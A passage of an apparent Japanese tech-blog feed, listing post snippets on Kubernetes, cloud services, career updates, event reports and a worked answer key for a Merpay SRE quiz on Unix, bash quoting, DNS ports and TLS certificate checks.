Workerを使った管理(Betaっぽい)自分としてはそれぞれのメリット・デメリットがあると感じましたので、まとめます。 1. Cookieを使ったSession管理メリット自分でCookieの長さを決められる.2週間に設定することもできる（ID Tokenの期限は1時間)古いブ...","link":"https://zenn.dev/satohjohn/articles/d39cf288dcfbe5e39c3b","isoDate":"2020-11-03T14:40:40.000Z","dateMiliSeconds":1604414440000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ビットコイン・ブロックチェーン入門","contentSnippet":"今注目を集める暗号通貨ビットコインとその基盤技術ブロックチェーン。\\rビットコインもオープンソースでできています。\\r難しいと言われるビットコインとブロックチェーンですが、\\r要点を絞って仕組みの全体像を解説するので、本講義は難しくありません。\\rビットコインについて話しますが、他のブロックチェーンプラットフォームを\\r知る上でも応用が効く内容となっています。","link":"https://speakerdeck.com/shukob/bitutokoinburotukutienru-men-a942d199-a1e6-41dc-873c-7649376f120b","isoDate":"2020-10-24T04:00:00.000Z","dateMiliSeconds":1603512000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Kubernetes Internal #1を開催しました","link":"https://bells17.medium.com/kubernetes-internal-1-ea0f1adcfe33?source=rss-713cf42ce34d------2","isoDate":"2020-10-19T10:29:31.000Z","dateMiliSeconds":1603103371000,"authorName":"bells17","authorId":"bells17"},{"title":"Istio の timeout, retry, circuit breaking, etc","link":"https://medium.com/@yteraoka/istio-%E3%81%AE-timeout-retry-circuit-breaking-etc-c170285447e8?source=rss-8b55af126a13------2","isoDate":"2020-10-17T14:52:08.000Z","dateMiliSeconds":1602946328000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"kubeadmの共通処理の実装","link":"https://bells17.medium.com/kubeadm-common-implementation-a5e5b3890dde?source=rss-713cf42ce34d------2","isoDate":"2020-09-12T19:22:01.000Z","dateMiliSeconds":1599938521000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes (k8s) 管理者用GUI Lens","contentSnippet":"Lensとはlensapp/lensk8sで動作する全てのリソースをモニタリングしてくれるGUIアプリLinux/Mac/Windowsで動作するこんな感じ（kindで作ったクラスタ見てます）…","link":"https://qiita.com/tozastation/items/804949c69df5d53643c6","isoDate":"2020-09-07T12:53:18.000Z","dateMiliSeconds":1599483198000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Cloud SQLへのprivate ip 接続でハマった話","contentSnippet":"概要Cloud SQL(MySQL)に対してprivate ipを使ってアクセスしたときに、何をチェックしたかをメモするハマったからにはきちんとログを残す現象GCE から Cloud SQL…","link":"https://qiita.com/SatohJohn/items/e79f363798a6233f9ad2","isoDate":"2020-08-07T16:53:50.000Z","dateMiliSeconds":1596819230000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"情報処理安全確保支援士の関連資料","contentSnippet":"情報処理安全確保支援士の業務を行う上で、参照すべき資料一覧です。サイバーセキュリティ基本法（平成二十六年法律第百四号）情報処理の促進に関する法律（昭和四十五年法律第九十号）情報処理学会倫理綱領RFC:1087 倫理とインターネット(Ethics and the Internet)セキュリティ対応組織 (SOC,CSIRT)強化に向けたサイバーセキュリティ情報共有の「5W1H」 v2.0 (2019年4月)JPCERT インシデントハンドリングマニュアルIPA 脆弱性対策の効果的な進め方（ツール活用編）情報セキュリティ早期警戒パートナーシップガイドラインIPA 重要なセキュリティ情報一覧IPA 共通脆弱性評価システムCVSS v3概説JVN (Japan Vulnerability Notes)JVN 脆弱性レポートの読み方JVN iPediaFIRST Common Vulnerability Scoring System SIGCWE (Common Weakness Enumeration)IPA 脆弱性体験学習ツール AppGoatMyJVNIPA 組織における内部不正防止ガイドライン地方公共団体における情報セキュリティポリシーに関するガイドライン(平成30年9月版)IPA 委託関係における情報セキュリティ対策ガイドラインIPA 中小企業の情報セキュリティ対策ガイドラインIPA 情報漏えい対策のしおりNISC スマートフォン等の業務利用における情報セキュリティ対策の実施手順作成手引書個人情報の保護に関する法律についてのガイドラインIPA 企業(組織)における最低限の情報セキュリティ対策のしおりスマートフォンのセキュリティ＜危険回避＞対策のしおりJPCERT/CC 技術メモ - 安全な Web ブラウザの使い方IPA ウェブブラウザのプロテクションプロファイル","link":"https://kyohmizu.hatenablog.com/entry/2020/08/05/115459","isoDate":"2020-08-05T02:54:59.000Z","dateMiliSeconds":1596596099000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"AWS CodeBuild において オンプレのJenkins では成功していたファイル権限系のテストをするとうまくいかない","contentSnippet":"この記事を書くに至った経緯私が開発しているチームでは、Jenkinsでビルド・テストを行っていました。色々と環境をAWSに載せ替えていく中で、AWS CodeBuildを使用することになりました。ところが、ReadOnlyに設定したファイルにWriteできないことをテストすると失敗しているではないか…","link":"https://qiita.com/tayakun/items/6b721985bc098dda9846","isoDate":"2020-06-22T15:15:05.000Z","dateMiliSeconds":1592838905000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Mac VScode Maven でJunit 使ってみた","contentSnippet":"はじめにとりあえずVSCodeでJUnit使ってユニットテスト体験してみたい人が対象です。まだJavaすらMacに入れてないんだ！って人はこちらを参考にしてみてください。動作環境macOS …","link":"https://qiita.com/tayakun/items/16201aa0371fa874ec78","isoDate":"2020-06-19T18:23:53.000Z","dateMiliSeconds":1592591033000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Handy Admission Webhook Library","contentSnippet":"Kubernetes の Admission Webhook を開発する際に、kubernetes/api をラップした軽量なライブラリやフレームワークを使うことがあると思います。kubernet…","link":"https://qiita.com/toVersus/items/5316e94490d60c220af7","isoDate":"2020-06-14T05:05:07.000Z","dateMiliSeconds":1592111107000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Mac VSCode JavaでHelloWorldした","contentSnippet":"はじめにタイトル通り、ただHelloWorldするだけです。よくある標準出力するだけの課題とかをささっとすますにはいいかもしれません。今からこの環境でWebアプリとか作っちゃうんだ！って人には…","link":"https://qiita.com/tayakun/items/a38386288c50233c6a90","isoDate":"2020-06-10T14:57:49.000Z","dateMiliSeconds":1591801069000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Chaos Mesh によるカオスエンジニアリング","link":"https://medium.com/@yteraoka/chaos-mesh-%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AB%E3%82%AA%E3%82%B9%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%83%AA%E3%83%B3%E3%82%B0-46fa2897c742?source=rss-8b55af126a13------2","isoDate":"2020-06-02T03:16:16.000Z","dateMiliSeconds":1591067776000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub ActionsからGAEにdeployする際のsecretの扱い","contentSnippet":"概要この記事の内容としては以下の通りGAEのapp.yamlが環境変数を読み取らないので、値をなんとか渡す方法。GitHubActionsで認証ファイルを扱う方法。ユースケースとして、GAE…","link":"https://qiita.com/SatohJohn/items/2341168ccb93c5e144ab","isoDate":"2020-05-13T08:20:51.000Z","dateMiliSeconds":1589358051000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"3月末日で退職してました","contentSnippet":"株式会社モバイルファクトリーを3/31で退職してました。2010年6月入社なので9年10ヶ月になりますね。今は新しい会社のSREチームで働いています。前半数年間はケータイ向けのサイト(いわゆる着メロサイト)やソーシャルアプリの開発運用をしていました。後半数年間は社内全体の開発基盤・運用基盤の整備をしていました。いわゆるインフラよりのお仕事ですね。入社当時Webアプリケーション開発をまったく分かってなかったところからなんとか人並みに運用開発できる力をこの会社で身につけることが出来たと思います。今なんとかwebエンジニアをやれてるのはこの会社のおかげと言っても過言では無いと思っています。入社当時SQLをまともに書けなかったくらいのレベルだったのでよく採用されたなと。。。お仕事的には回りのレベルも高いし、自身の仕事のやり方も裁量を与えられていたし、社内環境も、待遇も悪くなかった。むしろ良かったくらいでした。ただ、長年勤めていく内に悪い意味での慣れが出てきて、自分自身停滞感を感じることが出てきました。ここ数年が特に感じることが多く、停滞感から来る焦りを日々感じていました。どうにか停滞感を解消するために副業として他社のお仕事を請け負ったりしていましたが、どうにも解消ができずにいました。そんな折に現職のSREチームの話をいただきました。実際に面談、面接を受けて、課題や環境の話を聞くにつれて、ここでなら一歩進めるのではないかという感触を得ました。もちろん焦燥感、停滞感はあれど、居心地が良いと感じてた今までの環境を変えることにはかなりの葛藤がありました。いろんな決め手はあったのですが、新しい場所の方が一番の下手*1でいれそう、なにより事業的にも業務的にも仲間的にもワクワクできそうというあたりが決定打になりました。入社して2週間しかも、初日以外ずっと在宅勤務なのでまだ様子が摑めてないですが、早くキャッチアップしてバリバリ成果を出していきたい所存です。これからもよろしくお願いします。例のもの置いておきます。気が向いたらでよいです。https://www.amazon.jp/hz/wishlist/ls/3S4C1LCDWKCTM?ref_=wl_share*1:情熱プログラマ参照","link":"https://blog.masasuzu.net/entry/2020/04/12/134300","isoDate":"2020-04-12T04:43:00.000Z","dateMiliSeconds":1586666580000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"IAPに対応しているGAEにアクセスする","contentSnippet":"概要GCPにあるGAEに対してアクセスする場合、認証のためにIAPをつけることが多いハズその際にrequest clientに対して認証情報を付ける方法についてまとめるサービスアカウントを作るサービスアカウントは以下の通りに作成でき…","link":"https://qiita.com/SatohJohn/items/d21d8487f55ed911e687","isoDate":"2020-03-29T12:12:15.000Z","dateMiliSeconds":1585483935000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Vuetify.jsのリンクの違いについて","contentSnippet":"概要vuetifyのbuttonやlist-itemなどに対してnuxt linkをつける際にリンクの付け方は2つあるhreftoどう使い分けるかというと、 https://qiita.co…","link":"https://qiita.com/SatohJohn/items/881d9a6fceceda1c1ce7","isoDate":"2020-03-22T11:06:18.000Z","dateMiliSeconds":1584875178000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Merpay SRE Quiz @SRE Next 2020 解答・解説","contentSnippet":"これは何？2020年1月25日に行われた SRE NEXT 2020 で，メルペイさんがブースで出していた SRE に関するクイズです。正答数で景品がもらえたようです。3問以上：メルペイキーキャップ4問以上：メルペイキーキャップ＋メルペイ SRE が推薦する本今日は SRE NEXT に来ています！ブース出してます！メルペイSREが考えたクイズに挑戦してみてください！#srenext pic.twitter.com/sQmndWucrP— Mercari_Dev (@mercaridevjp) January 25, 2020 メルペイ SRE が推薦する本って？ツイートのスレッドをたどっていくと，ラインナップは以下のようでした。『入門 監視』『詳解 シェルスクリプト』『Kubernetes 完全ガイド』『Programming Kubernetes』『パケットキャプチャの教科書』『プロダクションレディ マイクロサービス』『Linux カーネル Hacks』『エンジニアリング組織論への招待』『エンジニアのためのマネジメントキャリアパス』名著ばかりですね。第1問 SLO とはなんの略でしょうか？選択肢Service Level Observability (サービスレベル可観測性)Service Level Objective (サービスレベル目標)System Level Observability (システムレベル可観測性)System Level Objective (システムレベル目標)正解Service Level Objective (サービスレベル目標)解説SRE 本の Chapter 4 - Service Level Objectives に書かれている定義は以下のとおりです。An SLO is a service level objective: a target value or range of values for a service level that is measured by an SLI.SLI（サービスレベル指標）の目標値または値の範囲を SLO（サービスレベル目標）といいます。第2問 ユーザーが所属しているユーザーグループを知るためのコマンドはどれか？選択肢idwhoamiwholsgroup正解id解説明示されていないですが，UNIX 系 OS のコマンドを前提としていますね。id：ユーザー情報を表示するコマンドで，ユーザー情報（ID，名前）とグループ情報（ID，名前）が表示されます。実行例：foobar@darkstar:~$ iduid=1016(foobar) gid=100(users) groups=100(users)whoami：実行ユーザーの ID を表示するコマンドです。id -un と等価です。who：実行ユーザーの情報（名前，プロセス，起動時刻など）を表示するコマンドです。lsgroup：グループの属性を表示する AIX（IBM の UNIX 系 OS）のコマンドです。デフォルトパラメータがないので，グループを指定するか ALL を指定する必要があります。これらのうち，ユーザーの所属グループが表示されるのは id コマンドです。第3問 $ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\" の出力結果はどれか？選択肢33 2 1error1正解3 2 1解説bash -c string：string が bash で実行されます。echo message：message と改行を出力します。パイプ |：コマンドの出力を次のコマンドの標準入力に渡します。ここでは，3 2 1\\\\n を awk コマンドの標準入力に渡します。awk \'パターン {アクション}\'：AWK のコマンドで，入力に対してパターンにマッチしたものにアクションを適用します。パターンを省略（空パターン）すると，全パターンにマッチする扱いになります。$ bash -c \\"... $1 ...\\"：\\"\\" で囲まれた$ は展開されます。1 という変数名は定義されていないので，$1 が展開されると空文字になります。AWK に伝わるスクリプトは \'{print }\' になり，全パターンに対してそのまま出力する挙動になります。したがって，$ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\"3 2 1となります。ちなみに，1番目のフィールドを表示させたい場合は，$ が展開されないように \\\\$ とエスケープします。$ bash -c \\"echo 3 2 1 | awk \'{print \\\\$1}\'\\"3bash -c \\"...\\" を噛まさなければ，シングルクォート \'\' で囲まれた $ が展開されず，意図通りの挙動になります。$ echo 3 2 1 | awk \'{print $1}\'3エスケープ・展開絡みの落とし穴を題材にした問題ですね。調べてみたら複数事例見つかり，ハマりポイントのようです。stackoverflow.comteratail.com第4問 DNS が使用するポート番号は何番ですか？選択肢225380443正解53解説すべて well-known ポート番号です。22：SSH53：DNS80：HTTP443：HTTPS第5問 Kubernetes の Deployment の Event を見られるコマンドは，以下のうちどれか？選択肢kubectl describe <Deployment Name>kubectl logs -l <Deployment Label>kubectl get deployment <Deployment Name> -o yamlkubectl logs <Deployment Name>正解kubectl describe <Deployment Name>解説kubectl describe：リソースの詳細な情報を出力します。Events: セクションにイベント情報が表示されます。kubectl get events コマンドで全リソースのイベントを表示することができます。kubectl logs：コンテナのログを出力します。--selector (-l) オプションで結果にフィルタをかけることができます。kubectl get：リソースの基本的な情報を取得します。kubectl get deployment <Deployment Name> -o yaml とすると，Deployment の定義を YAML 形式で出力します。kubectl describe コマンドの引数で Deployment の名称を指定すると，その Deployment に関連したイベントを取得できるので，kubectl describe <Deployment Name> が正解です。第6問 Web サイトに設定している TLS 証明書の有効期限を確認できるコマンドは以下のうちどれか？選択肢openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep Aftercurl --tlsv1.2 -l https://www.merpay.com | grep Expirewget --no-check-certificate https://www.merpay.com | grep Certnmap --script ssl-enum-ciphers -p 443 www.merpay.com | grep Date正解openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep After解説openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text：OpenSSL の SSL/TLS クライアントで指定されたホストに接続して証明書を取得し，x509 サブコマンドで証明書情報を取り出します。Not After : で始まる行に有効期限が書かれるので，grep で取り出せます。-text オプションの代わりに -dates オプションを指定すると，証明書の開始日と失効日だけが出力されます。curl --tlsv1.2 -l https://www.merpay.com：Response Body（ここでは HTML）が出力されます。TLS 証明書の情報は含まれません。wget --no-check-certificate https://www.merpay.com：指定した URL の内容を証明書の検証をせずにダウンロードしてファイル（ここでは index.html）に保存します。標準出力にはリクエストの実行ログが吐かれますが，TLS 証明書の情報は含まれません。nmap --script ssl-enum-ciphers -p 443 www.merpay.com：Nmap を用い，指定されたホストに対して SSL/TLS の暗号・圧縮方式を複数試行した結果を出力します。証明書の有効期限の情報は含まれません。実行例：PORT    STATE SERVICE REASON443/tcp open  https   syn-ack| ssl-enum-ciphers:|   TLSv1.0:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|       Weak certificate signature: SHA1|   TLSv1.2:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|_  least strength: CcURL，Nmap で実現する例は以下のとおりです。curl --tlsv1.2 -v https://www.merpay.com 2>&1 | grep expirenmap --script ssl-cert -p 443 www.merpay.com | grep afterserverfault.com感想骨のある問題が多いです。1，4を確実に正解して，その他をどれだけ正解できるかといった感じでしょうか。知らなければ調べればいい話ですが，業務でよく使うコマンドなら覚えておいて手足のように使いこなせるほうが望ましいでしょう。","link":"https://toshikish.hateblo.jp/entry/2020/02/11/024400","isoDate":"2020-02-10T17:44:00.000Z","dateMiliSeconds":1581356640000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2019年のふりかえり、2020年の目標","contentSnippet":"すでに年が明けて1ヶ月経ちましたが、2019年の活動を振り返ろうと思います。Kubernetes、Cloud Native技術を中心に学習を進めました。勉強会、カンファレンス1月Cloud Native Meetup Tokyo #6 KubeCon + CNCon RecapKubernetes Meetup Tokyo #15 - KubeCon 2018 RecapRancher/Kubernetes勉強会　Kubernetes管理ツールの活用法OWASP Connect in Tokyo #2今回は特別編！Cloud Nativeなアプリ開発から学んだことを全部シェア - cndjp#92月Yahoo! JAPAN MEETUP #31 インフラ技術カンファレンスGo 1.12 Release Party in Tokyo w/ Fukuoka&Umedassmjp 2019/02Docker Meetup Tokyo #28第三回ボトムアップドメイン駆動設計サイバーセキュリティシンポジウム3月k8s source code reading #3Cloud Native Meetup Tokyo #7 @Abema Towers4月Cloud Native Tokyo #01Serverlessについて思いを馳せる一夜 - cndjp第11回勉強会ssmjp 2019/04Rancher k3s もくもく勉強会 #035月レガシーをぶっつぶせ。現場でDDD！ssmjp 2019/05IIJ Technical NIGHT vol.7SRE Lounge #9Docker Meetup Tokyo #30 (DockerCon・KubeConEU報告会)Yahoo! JAPAN MEETUP #32 インフラ技術／Kubernetes6月NoOps Meetup Tokyo #6Kubernetes Meetup Tokyo #20 - KubeCon RecapGCPUG Tokyo Next Extended 2019 Infra DayInteract 20197月恐るることなかれ! Cloud NativeリレーショナルDB特集!! - cndjp第12回第三十五回 Azureもくもく会 @ 品川CloudNative Days Tokyo Meetup w/ Melanie CebulaKubernetes Meetup Tokyo #21 - Cloud Native CI/CDSekkeiKaigiCloud Native Days Tokyo 2019 → スタッフとして参加8月SRE Lounge #10CloudNative Days Tokyo 2019振り返りNightGo 1.13 Release Party in TokyoKubernetes Meetup Tokyo #229月Docker Meetup Tokyo #32Japan Azure User Group 9周年イベントXP祭り2019golang.tokyo #26Cloud Native Meetup Tokyo #10Kubernetes Meetup Tokyo #23 - Operator Deep Dive10月Terraform meetup tokyo#2Kubernetes Meetup Tokyo #24SRE Lounge #1111月さくらの夕べDocker/Kubernetesナイト #2Go Release 10 Year Anniversary Party in Tokyoゴリラ.vim #10 非公式VimConf後夜祭 girls.vimと合同開催技術書典8 はじめてのサークル参加meetupMicrosoft Open Tech Night #1 - インフラ編+Ignite速報俺たちの最適なCloud Nativeを求めて…。本気のこと始め！ - cndjp第13回12月Japan Rook Meetup #1Cloud Native Meetup Tokyo #11 KubeCon RecapGDG DevFest Tokyo 2019Microsoft Open Tech Night #3 - クラウドネイティブ編登壇資料speakerdeck.comspeakerdeck.comspeakerdeck.com書籍商業誌Kubernetes完全ガイドしくみがわかるKubernetesみんなのDocker/KubernetesKubernetes実践入門情報処理安全確保支援士 教科書みんなのGo言語インフラエンジニアの教科書Linuxのしくみ分散システムデザインパターン入門監視Linux教科書 LPICレベル1Docker実践ガイドKubernetes実践ガイド同人誌ふりかえり読本 場作り編ふりかえり読本 学び編ふりかえり読本 実践編理論と事例でわかる自己肯定感理論と事例でわかるモチベーション現場の「ズレ」を解消するコミュニケーションメソッド 第2版会話の引き出しを増やす 1on1カード と 使いこなしブックPrometheusでKubernetesを監視する本Kubernetes-Native Development & Deployment実践入門 Kubernetes カスタムコントローラへの道Knativeの歩き方資格情報処理安全確保支援士LPIC 101、102ツール・技術DockerKubernetesHelmPrometheusGrafanaLokiArgo CDConcourseTerraformTelepresencecert-managerWindowsコンテナMicrosoft AzureGo言語Vue.js社内での活動定期勉強会を主催ふりかえりを実施、ファシリテーター役Dockerワークショップを開催2020年の目標2020年もCloud Nativeを突き進む予定です。マストCKA、CKADを取得するコミュニティに貢献するOSSにコントリビュートするGo言語でのプログラミングに慣れる英語力を高めるできれば業務としてKubernetesを扱える環境に身を置く（遠回しな表現）技術書を書く","link":"https://kyohmizu.hatenablog.com/entry/2020/02/01/040351","isoDate":"2020-01-31T19:03:51.000Z","dateMiliSeconds":1580497431000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"テストで使いたくて，DinD (Docker in Docker) でk8sの環境を整えた","contentSnippet":"TL;DRこちらのDockerfileを見納めくださいkindとアプリケーションのコンテナを分けても良かったのですが，kubeconfigの受け渡しが面倒だったので妥協しましたhttps://…","link":"https://qiita.com/tozastation/items/eafde1a75c35bb9d1a68","isoDate":"2019-12-30T14:30:36.000Z","dateMiliSeconds":1577716236000,"authorName":"tozastation","authorId":"tozastation"},{"title":"0からはじめる Windows on Kubernetes","contentSnippet":"はじめにKubernetes の Windows 対応は v.1.14 でGAとなりました。本記事では、既存の Kubernetes クラスタに0から Windows ワーカーノードを追加する方…","link":"https://qiita.com/kyohmizu/items/dffdd49123b1e47c3ac4","isoDate":"2019-12-22T18:19:52.000Z","dateMiliSeconds":1577038792000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Knative Serving in Production","contentSnippet":"概要Knative Serving は、ステートレスなアプリケーションを対象に、HTTP リクエスト駆動で自動スケールする仕組みを提供します。Kubernetes (K8s) と Ingress (Isti…","link":"https://qiita.com/toVersus/items/1317a31fead9b836a68d","isoDate":"2019-12-18T22:00:21.000Z","dateMiliSeconds":1576706421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"キャリアアップ支援制度を利用してArchitecting on AWSを受講しましたというアドベントカレンダー書いてました","contentSnippet":"tech.mobilefactory.jpだいぶ前に受けたArchitecting on AWSの聴講記録です。","link":"https://blog.masasuzu.net/entry/2019/12/15/004259","isoDate":"2019-12-14T15:42:59.000Z","dateMiliSeconds":1576338179000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GDG DevFest Tokyo 2019に行ってきた","contentSnippet":"tokyo.gdgjapan.org珍しく、何も予定が入ってない土曜日だったので、行ってきました。最近GCPを触る機運が出てきたのでちょうどいいタイミングでした。以下メモGCP 101 | 坂田 純 | GDG DevFest Tokyo 2019主にCloudRunの話。HTTPをlistenするコンテナを起動するサービス。使った分だけ課金対象となる。リクエスト数次第で自動的にスケールする。とお手軽にできそうな印象。インターフェースがHTTPなので基本的にはパブリックでアクセス出来てしまうが、--no-allow-unauthticatedオプションをつけてデプロイするとで限られた人だけ実行できるようになります。これでバッチ的なことができそう?マイクロサービスの開発とテストファースト/テスト駆動開発 | 柴田 芳樹 | GDG DevFest Tokyo 2019ちょいちょいブログとかは見てましたが、話を聞くのは初めてでした。還暦を迎えてもコードをバリバリ書いてるのは素直に尊敬します。メルペイのマイクロサービスのテストにも興味深かったですが、組み込みでのテストの話も興味深く聴かせてもらいました。ツールや環境の充実度の差はあれど、組み込みでもウェブでもやるべきことは同じなのだなと思いました。CloudNative 時代における GKE/Kubernetes ではじめる開発 | 青山 真也 | GDG DevFest Tokyo 2019k8sの紹介的な話。k8s好きになりました。話がすごいうまくて、めんどくさそうだなあと思ってたkubernetesの印象が変わりました。その他:D社のブースを覗いたらMOVの構成図が展示されていて、IoT関連だけAWSを使っていてそれ以外はGCPを使ってるのが興味深かった。IoT関連のものも別で実装して、AWSからは引き上げるようなことを言ってて、なるほどなあとなりました。基本的にAWSで構成されたインフラばかり見てたのでなかなか新鮮でした。","link":"https://blog.masasuzu.net/entry/2019/12/14/000000","isoDate":"2019-12-13T15:00:00.000Z","dateMiliSeconds":1576249200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"【イベント参加レポート】Microsoft Ignite The Tour Tokyo","contentSnippet":"2019/12/5(木)、6(金)に開催された Microsoft の Tech イベントに参加しました。www.microsoft.com概要アメリカで行われた Ignite のセッションを再演登壇者は他人の資料で発表 (翻訳以上の改変はできないと聞きました)新情報の発表等はされず、通常セッションとハンズオンのみMicrosoft エキスパートとの交流の場外国人のスタッフを多数配置基本的には英語でやり取りするらしい (私は話しませんでした)感想外国人が多く、グローバルな印象を受けました。会場はいつものホテルでしたが、やはりセッションの入れ替え時は非常に混雑します。ブースのエリアはスペースを広くとってあり、割と閑散としていた気がします (セッション中は特に)。技術的には初級者向けの内容が多かったと思います。セッションよりは、どちらかといえばコミュニケーションを重視したイベントのようでした。MSの方やブースの担当者と話すことができ、有意義な時間を過ごせました。参加して得るものはありました。セッション参加セッションのまとめとメモ。THR30031 - Azure とコマンドライン－オプション、ヒント、テクニック難易度：初級メモエクスプローラーでcmdをパスに入力(powershell、wslも)Windows Console → Windows TerminalTerminalはStoreで入手可能Azure CLIやVSCode RemoteはサラッとAPPS30 - コンテナーを利用したアプリケーションの最新化資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps30難易度：初級要点コンテナ、Dockerの基礎的な説明コンテナランタイムやマルチステージビルド等は、軽く話に出る程度コンテナに関しては特に知らない話はなかったACRやACIの概要、使い方の軽い説明サービス移行のデモではコンテナ化してApp Service、CosmosDB、SQL Databaseを使用メモデータセンターのアプリをクラウドにLift&Shift仮想マシンはいいけど無駄が多いコンテナを使ったモダナイゼーションアプリの境界を明確にする旧バージョンの残りファイルがなくなるオーバーヘッドなしでリソース分離繰り返し可能なビルド、環境構築コンテナを使う理由あらゆる環境で同じように動作するベロシティの向上コンテナの仕組み高度に構成されたプロセスcgroupsnamespaceベースイメージからの差分をgzip化したものコンテナランタイムの軽い説明Docker以外にも対応、containerd、runCDockerfileイメージのビルド方法を説明するテキストファイルバッチスクリプトみたいなものビルドリポジトリACRACIサーバーレスのコンテナ実行環境ハイパーバイザーレベルの分離デモサービス移行の話APPS40 - インフラストラクチャと Azure Kubernetes Service を統合する資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps40難易度：中級要点AKSの作成手順の説明AKSとAzureの連携サービスについて知識を整理できたオートスケールの話は理解が浅かったので参考になったAKSを使う最大のメリットはAzureADとの連携ネットワークとセキュリティの話は非常に参考になったネットワークポリシーやAZメモ基本的な使い方ではなく、発展的な内容Tailwind Tradaersのデモ経営、ビジネス課題に対応復元力セキュリティ柔軟性スケールKubernetesを選択する理由抽象化のための標準化されたAPI自己修復スケーラビリティk8sアーキテクチャAKSはマスターノードが無料で提供されるネットワークに2種類指定できるデフォルトはkubenetAzure CNI 仮想ネットワークを使用。大規模ネットワークに対応。きちんと設計する必要があるACIを仮想ノードとして使用AZAKSの作成リソースグループ仮想ネットワークサブネットサービスプリンシパル(k8sから他のリソースを作成)クラスタ本番クラスタを作成するにはオプションを多数指定する必要がある作成時にしか設定できないオプションがあるインストール時にCNI、AZの設定をする仮想ノードの有効化ACIをAKSから使えるようにする必要があるRabbitMQ is 何？HPAメトリクスサーバーにPodから情報が送られる閾値を超えたらスケールクラスタオートスケーラーノードのスケール仮想ノードLinux、Windows、GPUに対応nodeselectorで指定仮想ノードによるスケールのデモネットワークとセキュリティACRでコンテナの脆弱性をチェックAKSを使う最大のメリットはAzureADとの連携！Azure Key VaultPod間の通信Pod IdentityNMI Server(Daemonset)MICAzure Identity BindingネットワークポリシーPod間トラフィックの保護Azure Network PolicyAzure CNIを使ったPodブリッジレベルCalico Network 